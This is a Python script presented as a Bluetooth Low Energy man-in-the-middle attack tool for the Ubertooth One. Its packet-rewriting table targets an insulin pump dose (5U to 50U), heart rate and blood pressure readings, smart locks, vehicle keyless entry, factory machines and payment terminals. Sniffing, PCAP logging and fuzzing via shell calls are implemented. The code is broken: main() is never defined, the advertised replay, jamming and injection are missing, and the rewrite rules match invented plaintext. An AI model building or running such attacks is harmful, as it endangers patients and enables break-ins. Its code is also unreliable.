import os
import argparse
import struct
import datetime
import re
import threading

"""
BLE MITM Attack - Ubertooth One Version

Features:
    - Sniffs BLE packets and logs them to a PCAP file.
    - Performs replay attacks using captured BLE packets.
    - Supports BLE jamming to disrupt connections.
    - Modifies intercepted packets based on a protocol library.
    - Detects weak encryption and other vulnerabilities in BLE traffic.
    - Injects custom packets dynamically during a MITM attack.
    - Provides an interactive mode for live command-based packet modification.
    - Supports hybrid attacks combining multiple techniques dynamically.
    - Supports expanded device protocols including automotive, industrial, and medical devices.
    - Adds BLE fuzzing capabilities to brute-force unprotected services.

Requirements:
    - Ubertooth One with firmware installed
    - ubertooth-btle, ubertooth-dfu, and ubertooth-util

Run Commands:
    - Sniff & log packets:
      python ble_mitm_ubertooth.py --target <MAC_ADDRESS> --log ble_sniff.pcap
    - Replay attack:
      python ble_mitm_ubertooth.py --target <MAC_ADDRESS> --replay
    - Jam BLE:
      python ble_mitm_ubertooth.py --jam
    - Inject custom packets:
      python ble_mitm_ubertooth.py --target <MAC_ADDRESS> --inject
    - Interactive mode:
      python ble_mitm_ubertooth.py --interactive
    - Fuzz BLE services:
      python ble_mitm_ubertooth.py --target <MAC_ADDRESS> --fuzz
"""

# Define protocol modifications for BLE MITM attacks with expanded targets
PROTOCOL_LIBRARY = {
    # Health & Medical Devices
    "heart_rate": {
        "uuid": "0000180d-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'heart_rate:75', b'heart_rate:200') if b'heart_rate' in packet else packet
    },
    "temperature_sensor": {
        "uuid": "00001809-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'temp:37', b'temp:99') if b'temp' in packet else packet
    },
    "blood_pressure": {
        "uuid": "00001810-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'bp:120/80', b'bp:200/150') if b'bp' in packet else packet
    },
    # Smart Home & IoT
    "smart_lock": {
        "uuid": "0000181e-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'lock:closed', b'lock:open') if b'lock' in packet else packet
    },
    "light_control": {
        "uuid": "00001812-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'light:off', b'light:on') if b'light' in packet else packet
    },
    # Industrial & Automotive
    "vehicle_sensor": {
        "uuid": "0000181a-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'speed:60', b'speed:200') if b'speed' in packet else packet
    },
    "factory_machine": {
        "uuid": "0000181f-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'machine:on', b'machine:off') if b'machine' in packet else packet
    },
    # Payment Terminals & Access Control
    "rfid_payment": {
        "uuid": "00001815-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'payment:auth', b'payment:fail') if b'payment' in packet else packet
    },
    # Automotive & Security Systems
    "vehicle_keyless_entry": {
        "uuid": "0000181b-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'vehicle_locked', b'vehicle_unlocked') if b'vehicle_locked' in packet else packet
    },
    # Medical Devices
    "medical_insulin_pump": {
        "uuid": "00001820-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'dose:5U', b'dose:50U') if b'dose' in packet else packet
    }
}

def write_pcap_header(file):
    """Writes the PCAP global header."""
    file.write(struct.pack("=IHHIIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 195))

def write_pcap_packet(file, packet_data):
    """Writes a captured BLE packet to the PCAP file."""
    ts_sec, ts_usec = map(int, datetime.datetime.now().strftime("%s %f").split())
    packet_length = len(packet_data)
    file.write(struct.pack("=IIII", ts_sec, ts_usec, packet_length, packet_length))
    file.write(packet_data)

def fuzz_ble_services(target_mac):
    """Performs BLE service fuzzing to brute-force weak services."""
    print(f"[INFO] Starting BLE fuzzing on {target_mac}...")
    cmd = f"ubertooth-btle -F -t {target_mac}"
    os.system(cmd)
    print("[INFO] BLE fuzzing complete.")

def start_sniffing(target_mac, log_file):
    """Starts BLE sniffing and logs packets to a PCAP file."""
    print(f"[INFO] Sniffing BLE traffic for {target_mac} and logging to {log_file}...")
    
    with open(log_file, 'wb') as pcap:
        write_pcap_header(pcap)
        
        cmd = f"ubertooth-btle -f -t {target_mac}"
        process = os.popen(cmd)
        
        try:
            for line in process:
                if "LE packet" in line:
                    packet_data = line.encode()
                    write_pcap_packet(pcap, packet_data)
                    print(f"[LOG] Captured packet: {packet_data.strip()}")
        except KeyboardInterrupt:
            print("\n[INFO] Stopping packet capture.")
            process.close()

if __name__ == "__main__":
    main()
